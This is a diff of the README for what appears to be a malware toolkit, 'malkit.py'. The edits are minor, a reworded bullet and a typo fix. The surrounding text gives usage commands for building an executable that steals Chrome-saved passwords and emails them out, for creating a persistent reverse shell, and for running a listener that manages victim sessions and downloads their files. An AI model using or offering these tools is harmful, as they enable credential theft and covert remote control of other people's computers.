@@ -175,7 +175,7 @@ example:
  ```  
  
 
- * Grabbing and sending chrome-saved passwords through email
+ * Building an executable that grabs and sends chrome-saved passwords through email
     - `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`  
 
  * Creating a persistent reverse_shell with additional features
@@ -188,7 +188,7 @@ example:
     - `python malkit.py build_listener -p 444`
     - This is the listener for the malware
     - While in the shell, you can use the `list` command to see active sessions.
-    - You can interact with a session by using the command: `interact::SESSION_NUMBER` where `SESSION_NUMBER` is the number of the session yo want to connect with. 
+    - You can interact with a session by using the command: `interact::SESSION_NUMBER` where `SESSION_NUMBER` is the number of the session you want to connect with. 
     - To go back into listener mode after interacting with a session, use the command `<bg` or `<background`
     - Other commands while interacting have been added but still experimental:
       - `<download` - Downloads a file from the server
